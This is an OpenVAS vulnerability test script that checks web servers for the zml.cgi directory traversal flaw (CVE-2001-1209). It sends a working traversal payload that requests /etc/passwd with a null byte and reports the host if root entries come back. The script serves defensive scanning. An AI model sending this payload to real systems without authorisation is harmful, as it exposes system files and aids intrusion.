# OpenVAS Vulnerability Test
# $Id: zml_cgi_traversal.nasl 17 2013-10-27 14:01:43Z jan $
# Description: zml.cgi Directory Traversal
#
# Authors:
# Drew Hintz ( http://guh.nu )
# based on scripts written by Renaud Deraison and  HD Moore
#
# Copyright:
# Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host contains a CGI script that is prone to directory
traversal attacks. 

Description :

ZML.cgi is vulnerable to a directory traversal attack.  It enables a
remote attacker to view any file on the computer with the privileges of
the cgi/httpd user.";

if(description)
{
 script_id(10830); 
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3759);
 script_cve_id("CVE-2001-1209");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");

 name = "zml.cgi Directory Traversal";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary;

 script_description(desc);
 
 summary = "zml.cgi is vulnerable to an exploit which lets an attacker view any file that the cgi/httpd user has access to.";
 
 script_summary(summary);
 script_category(ACT_GATHER_INFO);
 script_copyright("This script is Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/vulnwatch/2001-q4/0086.html");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);



if(!get_port_state(port))exit(0);


function check(req)
{
  req = http_get(item:req, port:port);
  r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if ( r == NULL ) exit(0);
  
  if("root:" >< r && egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   	security_warning(port:port);
	return(1);
  }
 return(0);
}

dirs = cgi_dirs();
foreach dir (dirs)
{
 url = string(dir, "/zml.cgi?file=../../../../../../../../../../../../etc/passwd%00");
 if(check(req:url))exit(0);
}
